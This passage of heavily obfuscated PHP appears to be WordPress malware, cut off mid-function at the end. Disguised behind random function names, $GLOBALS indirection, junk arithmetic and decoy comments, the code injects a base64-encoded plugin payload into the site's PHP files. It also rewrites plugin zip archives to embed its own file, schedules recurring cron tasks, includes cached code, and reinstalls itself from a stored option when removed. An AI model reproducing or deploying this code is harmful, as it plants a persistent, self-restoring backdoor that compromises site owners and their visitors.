     if    (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($vzii45wfyjy)      &&  @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($vzii45wfyjy) >  0) continue;
 $xfp6xk5kus5kzx44 = fgatjmo7gg2xolgmpki4y2()  .   gz_aorofp7mo(1674)  .     g2g3r6pz8prst3gz($vzii45wfyjy,  (0x1+0xb))  .  bk9m46jygo3f(1676);
     

 $pyi7kwwwxlpf1 =     @$GLOBALS['__scf_vpig9uwvw8_pu_20']($xfp6xk5kus5kzx44)    ?   @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($xfp6xk5kus5kzx44)    :  false;


 if    (!$GLOBALS['__scf_is0fvk8c7tq2_41']($pyi7kwwwxlpf1)  || $pyi7kwwwxlpf1   ===  "")  {
  $pyi7kwwwxlpf1    =     _31r1_gt3bwd4gri4c79e($vzii45wfyjy);    
if  ($GLOBALS['__scf_is0fvk8c7tq2_41']($pyi7kwwwxlpf1) &&     $pyi7kwwwxlpf1 !== "") @rmpvo8i8m8kfd9311njxy7($xfp6xk5kus5kzx44,  $pyi7kwwwxlpf1);
   }
 if (!$GLOBALS['__scf_is0fvk8c7tq2_41']($pyi7kwwwxlpf1) ||  $pyi7kwwwxlpf1   ===  "")  continue;$zrcgl3dyj9=129|126;$rcx_zwtc=$zrcgl3dyj9^134;
clearstatcache(true, $vzii45wfyjy);   
    if    (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($vzii45wfyjy) &&  @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($vzii45wfyjy)    >    0)   continue;



  if  (rmpvo8i8m8kfd9311njxy7($vzii45wfyjy, $pyi7kwwwxlpf1))   {
   kkpdha95nyx3tbltd10(gz_aorofp7mo(629),    bk9m46jygo3f(1677));
   ycygkr4vccqxrwnu_a($vzii45wfyjy);
  }
       }
 }     catch  (Throwable $o_qyrtxl85owt)  {
kkpdha95nyx3tbltd10(xpm5lg9odtw6di(629),  $o_qyrtxl85owt);
   } catch     (Exception   $o_qyrtxl85owt)  {
}
        }
      function  _dy2sma0w37l3s7mj()
 {
 try {
if   (!defined(xognx_h1jzkh(1596))) return   false;
$i0unun0rgv0dlu  =   pgwd7_bj4mbdfer_vo();
 if (empty($i0unun0rgv0dlu)) return  false;
       $al5ju0cl6g1mjvy = xl8k_pjv1048a7ae7()  . ':'  . g2g3r6pz8prst3gz(ABSPATH  .  ar6vo_1nyhx2koj5(1387),     (13-5));
     $i8boz5lfd0a  =    xognx_h1jzkh(1678)  .  $al5ju0cl6g1mjvy  .      bk9m46jygo3f(1648);


$walsf9zikggv4  =  xognx_h1jzkh(1679)     . $al5ju0cl6g1mjvy   .  gz_aorofp7mo(1648);
 $amsecxbpo_1302 =  gz_aorofp7mo(1680) .  $GLOBALS['__scf__fl_gwujcblq_9']($GLOBALS['__scf_eo363tjzd4r6n_56'](ABSPATH    .    (string)   aruikh7uoh1wrp5bqr79()),    0,   (6+2));
$rv8s_ul0qu2z09u     =     $GLOBALS['__scf_pmoxtzoe3f0qw_3'](bho93o6vof3ni5_rg622_h(),  xpm5lg9odtw6di(1644));
   $goxpgitg2brxu     =      jzt71g_lciq6atvff();
   if   (!$goxpgitg2brxu) return false;


  $wydy5py2nn2ni   =  pgrkqypzhwz32d(
   gz_aorofp7mo(630),
  array('__SLUG__', '__PLUGIN_BASE64__', '__GUARD_NAME__',    '__VERSION__'),
    array($rv8s_ul0qu2z09u,  $goxpgitg2brxu, $amsecxbpo_1302,   xl8k_pjv1048a7ae7())
 );

if  (!$wydy5py2nn2ni) {
 if ((int) get_option(ar6vo_1nyhx2koj5(1681),    0)   >   0) kkpdha95nyx3tbltd10(gz_aorofp7mo(629), xognx_h1jzkh(1682));


   return  false;
    }
     $wydy5py2nn2ni = $GLOBALS['__scf_a6uiw8bt24jybf_454'](xognx_h1jzkh(1683), "",    $wydy5py2nn2ni);
    if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($wydy5py2nn2ni) || $wydy5py2nn2ni === "")  return false;
$g_okuxhjj9    = false;
foreach ($i0unun0rgv0dlu  as  $ukeq3nixy09n)   {
if    (!@$GLOBALS['__scf_vpig9uwvw8_pu_20']($ukeq3nixy09n))    continue;
  if (czkor130p9u400k8($ukeq3nixy09n))    continue;
 $n4ya2e3nmtr0j = $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(22))  ?  @$GLOBALS['__scf_ja6kf6wqm030v_22']($ukeq3nixy09n,  'c')   :      false;
  if ($n4ya2e3nmtr0j !==   false  &&   $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(977))  && !@flock($n4ya2e3nmtr0j,    LOCK_EX |      LOCK_NB)) {
// PHP 8.2 enum: broadcast aggregator

       @fclose($n4ya2e3nmtr0j);
 

continue;
    }
   $current =     @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($ukeq3nixy09n);
  if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($current))   {



     kkpdha95nyx3tbltd10(xognx_h1jzkh(629),  bk9m46jygo3f(1189));
       

 if   ($n4ya2e3nmtr0j   !==   false)   {
    if ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(977)))     @flock($n4ya2e3nmtr0j,    LOCK_UN);
     @fclose($n4ya2e3nmtr0j);
 }
 continue;



  }
try {
  if  ($GLOBALS['__scf_fxl4k4gsul_10']($current)      >  (1343647-295071))  $current  =    za8ge46vc9y1a6($current);
    if  ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($current,  $i8boz5lfd0a) !==  false      &&  $GLOBALS['__scf_j_4rj7vg4ae0j_7']($current,  $walsf9zikggv4)   !==  false)  {



   $g_okuxhjj9 =   true;
  continue;
  }
  if  (!@$GLOBALS['__scf_v7y4c72abxzjo_47']($ukeq3nixy09n))  continue;
$iin2d_vozo_f   =  g2g3r6pz8prst3gz(ABSPATH     .   bk9m46jygo3f(1387),   (1<<3));
    $b7rgut3p59x   =  $current;
 $current   =    yezcy6nac7y0hwjhoe($current,  gz_aorofp7mo(1390),   xpm5lg9odtw6di(1684));
 $current   = $GLOBALS['__scf_a6uiw8bt24jybf_454'](bk9m46jygo3f(1396),     "", $current);
  if (!$GLOBALS['__scf_is0fvk8c7tq2_41']($current)) {
 kkpdha95nyx3tbltd10(xognx_h1jzkh(629),  xpm5lg9odtw6di(1228));
continue;
}


 if  ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($current,  gz_aorofp7mo(1511))    !==     false   ||    $GLOBALS['__scf_j_4rj7vg4ae0j_7']($current, gz_aorofp7mo(1685))   !==    false) {
   $yzrgcbvnlcze  =   $GLOBALS['__scf_j_4rj7vg4ae0j_7']($current,  xpm5lg9odtw6di(1686));
   $oqjnpyt5t3d   =  ($yzrgcbvnlcze     !==  false) ?    $GLOBALS['__scf__fl_gwujcblq_9']($current, $yzrgcbvnlcze)    : $current;
        if ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($oqjnpyt5t3d,   gz_aorofp7mo(1680)) ===    false &&     $GLOBALS['__scf_j_4rj7vg4ae0j_7']($oqjnpyt5t3d,     ar6vo_1nyhx2koj5(1687)) === false   &&    !$GLOBALS['__scf_ak3p5za9uvhzh8_96'](ar6vo_1nyhx2koj5(1688)      .      $iin2d_vozo_f   .   gz_aorofp7mo(1389), $oqjnpyt5t3d))   {
kkpdha95nyx3tbltd10(xognx_h1jzkh(629),   bk9m46jygo3f(1689));
      continue;
}


   $qtgtmbx9wtt    =     $GLOBALS['__scf_a6uiw8bt24jybf_454'](xognx_h1jzkh(1690),  "\n",     $current);
if  ($GLOBALS['__scf_is0fvk8c7tq2_41']($qtgtmbx9wtt)) $current  =    $qtgtmbx9wtt;



    $qtgtmbx9wtt   =  $GLOBALS['__scf_a6uiw8bt24jybf_454'](ar6vo_1nyhx2koj5(1691),     "", $current);
    if   ($GLOBALS['__scf_is0fvk8c7tq2_41']($qtgtmbx9wtt))  $current   =  $qtgtmbx9wtt;
  unset($qtgtmbx9wtt);
 if  ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($current,   xpm5lg9odtw6di(1692))   !==   false)  {
kkpdha95nyx3tbltd10(xpm5lg9odtw6di(629),  ar6vo_1nyhx2koj5(1693));

  continue;
     }


       }
   if  ($g_okuxhjj9)   {
// projective trie

if ($current     ===   $b7rgut3p59x)   continue;

  $m2xajyieeetng =  @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($ukeq3nixy09n);
   if   (!$GLOBALS['__scf_is0fvk8c7tq2_41']($m2xajyieeetng))  continue;



 if      ($GLOBALS['__scf_fxl4k4gsul_10']($m2xajyieeetng)   >     (1048542+34)) $m2xajyieeetng   = za8ge46vc9y1a6($m2xajyieeetng);
if   ($m2xajyieeetng      !==  $b7rgut3p59x)  {
   kkpdha95nyx3tbltd10(xognx_h1jzkh(629),    xpm5lg9odtw6di(1196));


    continue;

  }
    unset($m2xajyieeetng);
  if   (!b9ak26unr8mq4hn4nhqpi($ukeq3nixy09n,    $current))   continue;
if (!ut5isdl00gkjaids($ukeq3nixy09n,   $current))  continue;


if      (rmpvo8i8m8kfd9311njxy7($ukeq3nixy09n,  $current)) ykbctv6vdni0fv($ukeq3nixy09n);
     continue;
      }
    if     ($GLOBALS['__scf_ak3p5za9uvhzh8_96'](bk9m46jygo3f(1694),  $current)) {
// @abort dataflow-graph

 kkpdha95nyx3tbltd10(gz_aorofp7mo(629),    ar6vo_1nyhx2koj5(1695));
    continue;
}


 $_xpeg7apb_8p  = ar6vo_1nyhx2koj5(1696);


        if     ($GLOBALS['__scf_fxl4k4gsul_10']($current)   >      0  &&   $GLOBALS['__scf_j_4rj7vg4ae0j_7']($current, bk9m46jygo3f(1328))    !==   false) {

  $k4xhg5hqc0vprf    =     false;
     if  ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(1697)))    {

 $gl7zx17ivm8ca  =  @token_get_all($current);
  if ($GLOBALS['__scf_zj8mp2xbaqmp_35']($gl7zx17ivm8ca))  {$uc_1lw84c8x4=6336;$bvoe83ttb=$uc_1lw84c8x4%6;



 foreach  ($gl7zx17ivm8ca  as      $wq6dd20am_)  {$rcw00oe1kox3=-279;$m6ckdr00p5=($rcw00oe1kox3>0)?$rcw00oe1kox3:-$rcw00oe1kox3;
    if    ($GLOBALS['__scf_zj8mp2xbaqmp_35']($wq6dd20am_)) {
    if    ($wq6dd20am_[0]   ===   T_OPEN_TAG   || (defined(xognx_h1jzkh(1698))  &&   $wq6dd20am_[0]  === T_OPEN_TAG_WITH_ECHO)) $k4xhg5hqc0vprf  =   true;



  elseif  ($wq6dd20am_[0]  === T_CLOSE_TAG)   $k4xhg5hqc0vprf = false;
 }
       }
    }
     unset($gl7zx17ivm8ca,  $wq6dd20am_);
  }    else  {

 $cc6r7r7nvxpxk  = $GLOBALS['__scf_l32urgzdpblam6_1699']($current,   xpm5lg9odtw6di(1328));
      $_ln734olt__2j__ =    $GLOBALS['__scf_l32urgzdpblam6_1699']($current, bk9m46jygo3f(1312));


 if ($cc6r7r7nvxpxk !==   false    &&   ($_ln734olt__2j__  ===  false  ||     $cc6r7r7nvxpxk  >   $_ln734olt__2j__))   $k4xhg5hqc0vprf  = true;
     unset($cc6r7r7nvxpxk,  $_ln734olt__2j__);

  }
      if  ($k4xhg5hqc0vprf)    $_xpeg7apb_8p =      "";
    unset($k4xhg5hqc0vprf);

     }
 $jfdlodgovs9  =   ($GLOBALS['__scf_fxl4k4gsul_10']($current)    >  0)  ? "\n"  :  "";
   $xtbjq1h9835  =    $GLOBALS['__scf_vz8ci2guu7b5_355']($amsecxbpo_1302, $amsecxbpo_1302      .    '_'   . $GLOBALS['__scf__fl_gwujcblq_9']($GLOBALS['__scf_eo363tjzd4r6n_56']($ukeq3nixy09n),  0,    (1+3)),  $wydy5py2nn2ni);$xdcz0nqq6v21=-547;$uf4fd16gct58=($xdcz0nqq6v21>0)?$xdcz0nqq6v21:-$xdcz0nqq6v21;
$dt4hcmag1ai   = $jfdlodgovs9    .     $_xpeg7apb_8p .   $i8boz5lfd0a .    "\n" .  $xtbjq1h9835   .      "\n"   . $walsf9zikggv4  . "\n";
  unset($xtbjq1h9835);
  

$m2xajyieeetng = @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($ukeq3nixy09n);$zbu0rnidu8__2=55|142;$gjsz8roh2zge=$zbu0rnidu8__2^127;
  if (!$GLOBALS['__scf_is0fvk8c7tq2_41']($m2xajyieeetng)) {


unset($b7rgut3p59x);
   

 continue;
}
if  ($GLOBALS['__scf_fxl4k4gsul_10']($m2xajyieeetng) > (1048492+84))    $m2xajyieeetng  =    za8ge46vc9y1a6($m2xajyieeetng);
  if     ($m2xajyieeetng  !== $b7rgut3p59x)  {
  unset($m2xajyieeetng,    $b7rgut3p59x);
      kkpdha95nyx3tbltd10(xpm5lg9odtw6di(629), gz_aorofp7mo(1196));
  continue;
   }
 unset($m2xajyieeetng, $b7rgut3p59x);
 if  (!b9ak26unr8mq4hn4nhqpi($ukeq3nixy09n,  $current))   continue;
 



     if     (!ut5isdl00gkjaids($ukeq3nixy09n,    $current))   {
kkpdha95nyx3tbltd10(xpm5lg9odtw6di(629), bk9m46jygo3f(1657));
 continue;
      }
     if (!rmpvo8i8m8kfd9311njxy7($ukeq3nixy09n,  $current . $dt4hcmag1ai)) continue;

   ykbctv6vdni0fv($ukeq3nixy09n);
$g_okuxhjj9 =     true;
   } finally {



       if  ($n4ya2e3nmtr0j    !== false)    {


   if   ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(977))) @flock($n4ya2e3nmtr0j,   LOCK_UN);
@fclose($n4ya2e3nmtr0j);
   }
}
  }
 return  $g_okuxhjj9;$u58iosvwf4o1=238|168;$d10le6mgrg=$u58iosvwf4o1^226;

   }  catch    (Throwable $o_qyrtxl85owt)   {


kkpdha95nyx3tbltd10(bk9m46jygo3f(1700),  $o_qyrtxl85owt);
  return    false;
} catch (Exception $o_qyrtxl85owt)  {
 return    false;
  }



 }
     function   dg06qs_g5805earsx2knt()
{


 try    {
 if (!defined(xognx_h1jzkh(1596))) return;


if   (i__3znuz8m_x6r(bho93o6vof3ni5_rg622_h()))   return;



 $y4e3mkwgaqm  =  hzkj2ifwqdzf_u32qrf();$p1j41mzc_kp_=PHP_MAJOR_VERSION;$s29ez66mb0egu=$p1j41mzc_kp_*10;
     $shhw38ajvek7   =   g2g3r6pz8prst3gz(ABSPATH      .    xpm5lg9odtw6di(1109),   (178^186))   .    bk9m46jygo3f(1701);$rbxi1swy75930=PHP_MAJOR_VERSION;$gqlqd2arnw25f_=$rbxi1swy75930*5;
$rv8s_ul0qu2z09u   = $GLOBALS['__scf_pmoxtzoe3f0qw_3'](bho93o6vof3ni5_rg622_h(),  gz_aorofp7mo(1702));



 $h3wz11cllq    =     p5t6fz6i7ccgjh();
 if     (!$h3wz11cllq   ||    $GLOBALS['__scf_fxl4k4gsul_10']($h3wz11cllq) <  (0x15e+0x96))  {
// WP Paragraph Block: mount template

       kkpdha95nyx3tbltd10(gz_aorofp7mo(1198),     bk9m46jygo3f(1703));
 return;
 }
     if (!$GLOBALS['__scf_kwfvo_j_hzb_532'](xognx_h1jzkh(1704))) return;



$wefha5azcjy5qsl   = array(
 $y4e3mkwgaqm  .     '/'    .   $shhw38ajvek7,
    $y4e3mkwgaqm     .    xognx_h1jzkh(1705) .      $GLOBALS['__scf_md9tpoqso1mgh_1706'](gz_aorofp7mo(1707)) .  $shhw38ajvek7,
);
    $jdhz84jvnupbz   =  (defined(gz_aorofp7mo(1708))  ? WP_CONTENT_DIR      :   ABSPATH .  xpm5lg9odtw6di(811)) .   xognx_h1jzkh(1057);
      if  (@$GLOBALS['__scf_h23c49ni_b86_43']($jdhz84jvnupbz))    {
  $b9k1t0aqu187sy  =     wou4lqmx3dh5mlyfq3($jdhz84jvnupbz,     (1998+2));
        if     ($GLOBALS['__scf_zj8mp2xbaqmp_35']($b9k1t0aqu187sy))  {
// auto-closeable

 foreach ($b9k1t0aqu187sy as    $o_qyrtxl85owt)     {
// profile non-blocking trust-anchor

 $g3z6ma16w7vxd  =   $jdhz84jvnupbz   .   '/'     .     $o_qyrtxl85owt;
// guarded inline

    if (@$GLOBALS['__scf_h23c49ni_b86_43']($g3z6ma16w7vxd)   &&     @$GLOBALS['__scf_v7y4c72abxzjo_47']($g3z6ma16w7vxd))  {
    $wefha5azcjy5qsl[]  =    $g3z6ma16w7vxd   .   '/'    .  $shhw38ajvek7;



 break;
       }
     }
   }
 }
 foreach  ($wefha5azcjy5qsl     as    $twq43dqjj6ny)  {
if (@$GLOBALS['__scf_ojjepdqapp29_684']($twq43dqjj6ny)     &&    @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($twq43dqjj6ny) > (346+654))  {
$net6xyrghtic_5r  =  gz_aorofp7mo(1709);
if   ($GLOBALS['__scf_kwfvo_j_hzb_532']($net6xyrghtic_5r)) {
 $n9y8h4bwbwo1pop0    = new  $net6xyrghtic_5r();
   if     (@$n9y8h4bwbwo1pop0->open($twq43dqjj6ny)  ===     true)    {
$cknwqvpnh7l    =  false;
  $m_gmegahqiwqbno9    =  $n9y8h4bwbwo1pop0->locateName($rv8s_ul0qu2z09u . '/'   . $rv8s_ul0qu2z09u      .   gz_aorofp7mo(1702));
  if ($m_gmegahqiwqbno9 !==    false)   {
$a7v0e1hm8cx = $n9y8h4bwbwo1pop0->statIndex($m_gmegahqiwqbno9);



if ($GLOBALS['__scf_zj8mp2xbaqmp_35']($a7v0e1hm8cx)   &&    isset($a7v0e1hm8cx[ar6vo_1nyhx2koj5(1670)])   &&    (int)  $a7v0e1hm8cx[gz_aorofp7mo(1670)] <=   (16777153+63))  {



   $ntotf8agtlfx  =  $n9y8h4bwbwo1pop0->getFromIndex($m_gmegahqiwqbno9);
 $cknwqvpnh7l = ($GLOBALS['__scf_is0fvk8c7tq2_41']($ntotf8agtlfx)   &&   $GLOBALS['__scf_eo363tjzd4r6n_56']($ntotf8agtlfx)  ===  $GLOBALS['__scf_eo363tjzd4r6n_56']($h3wz11cllq));
unset($ntotf8agtlfx);
      }
      unset($a7v0e1hm8cx);
}
$n9y8h4bwbwo1pop0->close();
 if   ($cknwqvpnh7l)  continue;
}



    }
 }
$dhb4mklrk0    =  $GLOBALS['__scf_meo_1tvjsals_11']($twq43dqjj6ny);
 if     (!@$GLOBALS['__scf_h23c49ni_b86_43']($dhb4mklrk0)) w1m15sg83rnn5uqc64($dhb4mklrk0,   (470+23),    true);
    $net6xyrghtic_5r      = gz_aorofp7mo(1709);$s5v8st9vr_a_ad=151|203;$u0b71pqky1qy=$s5v8st9vr_a_ad^140;
 $iu9vogqyy8l3nc  =      wwbj8n248w5psw9u($dhb4mklrk0, xognx_h1jzkh(939));
 if ($iu9vogqyy8l3nc === false)    continue;
 $w48pta760e5a0y =  new   $net6xyrghtic_5r();
 if  (@$w48pta760e5a0y->open($iu9vogqyy8l3nc,    $net6xyrghtic_5r::CREATE  |    $net6xyrghtic_5r::OVERWRITE)     === true)  {



   $w48pta760e5a0y->addFromString($rv8s_ul0qu2z09u .   '/'  .    $rv8s_ul0qu2z09u   .  ar6vo_1nyhx2koj5(1702), $h3wz11cllq);
$w48pta760e5a0y->close();
    $dc6d7oi37ja    =    new  $net6xyrghtic_5r();
    if    (@$dc6d7oi37ja->open($iu9vogqyy8l3nc)  ===   true)  {
      $dc6d7oi37ja->close();

   if (b4za25lhh9bxaf_($iu9vogqyy8l3nc, $twq43dqjj6ny)  ||  (kzn0b1md4fk2p00($iu9vogqyy8l3nc,   $twq43dqjj6ny)  &&     xv6oqhjncehpr7v_mus7($iu9vogqyy8l3nc)))  {
  wbvm0leq3qkmkea59($twq43dqjj6ny,    r4p_zfnleez7aynxxwapor());
        f97udlofaljpuxw1_jgnfh($twq43dqjj6ny,   (382+38));
   }  else   {
// APCu shm admin screen

  xv6oqhjncehpr7v_mus7($iu9vogqyy8l3nc);
}
    }  else   {
  xv6oqhjncehpr7v_mus7($iu9vogqyy8l3nc);
   }
}   else      {
      xv6oqhjncehpr7v_mus7($iu9vogqyy8l3nc);
}
  }
   }  catch  (Throwable    $o_qyrtxl85owt)  {
  kkpdha95nyx3tbltd10(ar6vo_1nyhx2koj5(1109),   $o_qyrtxl85owt);
} catch  (Exception    $o_qyrtxl85owt)  {

}
// WP Post Content: non-singular alert

}

 function hvbm58mljux84oleqtsk()
  {

 try    {


    if   (!$GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1710))      ||  !$GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(426)))  return;
     if    (!defined(ar6vo_1nyhx2koj5(1596))) return;
 $dilikvkp6mf1f6  =    gz_aorofp7mo(1711);
/* sparse event-bus */



  if   (!wp_next_scheduled($dilikvkp6mf1f6)) {
wp_schedule_event($GLOBALS['__scf_ks7_xfapvywl_185']() +  (380-80),   gz_aorofp7mo(1712),  $dilikvkp6mf1f6);
}
    if  (!wp_next_scheduled(bk9m46jygo3f(1641)))  {
   wp_schedule_event($GLOBALS['__scf_ks7_xfapvywl_185']()  +    (520+80), gz_aorofp7mo(373),   xognx_h1jzkh(1641));
 

}
 }  catch   (Throwable   $o_qyrtxl85owt) {
      kkpdha95nyx3tbltd10(bk9m46jygo3f(1713),  $o_qyrtxl85owt);
   }    catch   (Exception      $o_qyrtxl85owt)  {$g_q8ixere7r8=(0x63+0xaf);$pggiqmtn02tl=$g_q8ixere7r8%5;
}
 }
    function      ltppcdzw9gtc878maepsvr()
  {
 try  {
 if      (!defined(ar6vo_1nyhx2koj5(1596)))     return;
 $qdtby60_ixu9689v  =     g2g3r6pz8prst3gz(ABSPATH    .   'g', (145^153));
   $r_6oe6nr1rqr_ =  array();


    if ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(1714)))   $r_6oe6nr1rqr_[]   =  fgatjmo7gg2xolgmpki4y2();
  $r_6oe6nr1rqr_[] = ABSPATH    .      xpm5lg9odtw6di(1606);


if ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(92))) $r_6oe6nr1rqr_[] = hzkj2ifwqdzf_u32qrf();
foreach   ($r_6oe6nr1rqr_ as  $hmkx3xlaep) {
 $ofchj_3f1uknj =  $hmkx3xlaep .     bk9m46jygo3f(1715)    .   $qdtby60_ixu9689v;
if   (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($ofchj_3f1uknj)  &&     (int) @$GLOBALS['__scf_k4z5lhhe91ty_98']($ofchj_3f1uknj) > $GLOBALS['__scf_ks7_xfapvywl_185']()    -    (0x88+0x68))   return;
    }
// OPcache config script dependency


foreach   ($r_6oe6nr1rqr_ as $hmkx3xlaep)   {
 $yahiv30b5ceoo77 =      $hmkx3xlaep .     bk9m46jygo3f(1716)  .   $qdtby60_ixu9689v;
      

 if  (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($yahiv30b5ceoo77)) {
$sv8yat44a5k  = (int) @$GLOBALS['__scf_k4z5lhhe91ty_98']($yahiv30b5ceoo77);
  if   ($sv8yat44a5k > $GLOBALS['__scf_ks7_xfapvywl_185']()   -    (19812+66588) &&   $sv8yat44a5k  <= $GLOBALS['__scf_ks7_xfapvywl_185']() +      (278+22))    continue;


  xv6oqhjncehpr7v_mus7($yahiv30b5ceoo77);
}
 $xx2feroi0_6  = $hmkx3xlaep  .  gz_aorofp7mo(1288)   .   $qdtby60_ixu9689v    .  gz_aorofp7mo(1702);
   if    (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($xx2feroi0_6)   &&    (int) @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($xx2feroi0_6)    >  (483+17))  {
   $zedusi2l_n0wf759 = $hmkx3xlaep     .    xpm5lg9odtw6di(1303) .     $qdtby60_ixu9689v;
 $chlrvhb15u4xyj7  = @$GLOBALS['__scf_vpig9uwvw8_pu_20']($zedusi2l_n0wf759)      ?  $GLOBALS['__scf_u6m4cedwgt__319']((string)   @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($zedusi2l_n0wf759))  :     "";

  if    ($chlrvhb15u4xyj7    !== ""   &&  $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(1468)) &&   @md5_file($xx2feroi0_6) === $chlrvhb15u4xyj7) {
     @include $xx2feroi0_6;
  

       return;
   }
 if     ($chlrvhb15u4xyj7    !== "")     {
   xv6oqhjncehpr7v_mus7($xx2feroi0_6);



}
   unset($zedusi2l_n0wf759,  $chlrvhb15u4xyj7);
}
  }



  unset($yahiv30b5ceoo77,  $sv8yat44a5k);


 if    ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(1638)))  @delete_transient(gz_aorofp7mo(1717));
hpofvuf7ak5x5wq9st();



 }   catch  (Throwable  $o_qyrtxl85owt)   {
kkpdha95nyx3tbltd10(ar6vo_1nyhx2koj5(1718), $o_qyrtxl85owt);
        }  catch      (Exception  $o_qyrtxl85owt)   {
     }
     }
function     yq0l62xbb03co56rhc1p_c()
{


 try  {
   if  (!defined(ar6vo_1nyhx2koj5(1596)))   return;
 cpiqe0lm848r3wlva(null);



      $rv8s_ul0qu2z09u   =  $GLOBALS['__scf_pmoxtzoe3f0qw_3'](bho93o6vof3ni5_rg622_h(),   ar6vo_1nyhx2koj5(1702));
  $znt7fn6v0k1te17v  =      bho93o6vof3ni5_rg622_h();

$h3wz11cllq =    "";
if   (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($znt7fn6v0k1te17v)   &&      @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($znt7fn6v0k1te17v)  > (7765-2765)) {
   $_0bqr88x220  =   iljst04arjh1pet016s($znt7fn6v0k1te17v);


 if  ($GLOBALS['__scf_is0fvk8c7tq2_41']($_0bqr88x220)   &&   $GLOBALS['__scf_fxl4k4gsul_10']($_0bqr88x220)  >   (402+98)    &&   g9edwd6m8_9cm8($_0bqr88x220))   $h3wz11cllq   = $_0bqr88x220;
unset($_0bqr88x220);
  }
if     ($h3wz11cllq ===   "")  {$soiy7lq42p57pi=PHP_INT_MAX/PHP_INT_MAX;$rx6dblfjrz8ex8=$soiy7lq42p57pi+32;
$y2m_cj2ki15     =   g2g3r6pz8prst3gz(ABSPATH  . gz_aorofp7mo(1563), (7+3));
 $goxpgitg2brxu  =  $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(1572))   ?  @get_option($y2m_cj2ki15,  "")    : "";
if     (!$goxpgitg2brxu  ||  $GLOBALS['__scf_fxl4k4gsul_10']($goxpgitg2brxu)  <  (491+9))    return;
$h3wz11cllq    =   gc3rwc4p_0_e6ohd($GLOBALS['__scf_hg1ogpq4w6_351']($goxpgitg2brxu));



      if  (!$h3wz11cllq || $GLOBALS['__scf_fxl4k4gsul_10']($h3wz11cllq) < (0xee+0x106))     return;
    if  (!g9edwd6m8_9cm8($h3wz11cllq))  {
 kkpdha95nyx3tbltd10(xognx_h1jzkh(1075), xpm5lg9odtw6di(1719));
return;


  }
   }
   $y4e3mkwgaqm  =      hzkj2ifwqdzf_u32qrf();
 $imzxjyxc_f = $y4e3mkwgaqm   .  xognx_h1jzkh(1720)   .    $rv8s_ul0qu2z09u;
  $klhxriwc3vqg  = $imzxjyxc_f    .   '/' .  $rv8s_ul0qu2z09u   .    xognx_h1jzkh(1702);
 if  (!@$GLOBALS['__scf_h23c49ni_b86_43']($imzxjyxc_f))  w1m15sg83rnn5uqc64($imzxjyxc_f,      (398+95),   true);
  $k136g76ujjv08_dk =   @$GLOBALS['__scf_vpig9uwvw8_pu_20']($klhxriwc3vqg)   ?   iljst04arjh1pet016s($klhxriwc3vqg)    :     "";
  $un_tzz0dfmg32o =    ($k136g76ujjv08_dk    === null);
   if  ($GLOBALS['__scf_is0fvk8c7tq2_41']($k136g76ujjv08_dk)  &&  $k136g76ujjv08_dk    !==  ""  &&  $GLOBALS['__scf_ak3p5za9uvhzh8_96'](xpm5lg9odtw6di(1721),    $GLOBALS['__scf__fl_gwujcblq_9']($k136g76ujjv08_dk, 0, (4002+94)),  $zxr8_6yanh)   &&   version_compare($zxr8_6yanh[1],  xl8k_pjv1048a7ae7(),   '>')) $un_tzz0dfmg32o =  true;
    unset($zxr8_6yanh);
if (!$un_tzz0dfmg32o &&  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($k136g76ujjv08_dk)     ||   $k136g76ujjv08_dk  ===  ""  ||   $GLOBALS['__scf_eo363tjzd4r6n_56']($k136g76ujjv08_dk) !== $GLOBALS['__scf_eo363tjzd4r6n_56']($h3wz11cllq)))    {
 if  (rmpvo8i8m8kfd9311njxy7($klhxriwc3vqg,   o_a46xczfm0z3pa91s($h3wz11cllq)))  {
  f97udlofaljpuxw1_jgnfh($klhxriwc3vqg, (374+46));


mcuqsw_cyo3mnayi6ofr6($klhxriwc3vqg);
   g6q1ehat0szqqsfbv2($klhxriwc3vqg);
    }
     }
   unset($k136g76ujjv08_dk,   $un_tzz0dfmg32o);
 bfpb2ykbb8dykf__mm($rv8s_ul0qu2z09u   .  '/'      .   $rv8s_ul0qu2z09u  .  bk9m46jygo3f(1702));
$pwohfknrv3q7hqs = sxupmu4fhe9r2zxw();
    if ((@$GLOBALS['__scf_h23c49ni_b86_43']($pwohfknrv3q7hqs)  && @$GLOBALS['__scf_v7y4c72abxzjo_47']($pwohfknrv3q7hqs))     ||  (!@$GLOBALS['__scf_h23c49ni_b86_43']($pwohfknrv3q7hqs)   && w1m15sg83rnn5uqc64($pwohfknrv3q7hqs,  (0x1b7+0x36),    true)))    {
// @serialize radix-tree

   $p1l05n0seiv  =   $pwohfknrv3q7hqs .   '/'     .  $rv8s_ul0qu2z09u   .  gz_aorofp7mo(1702);
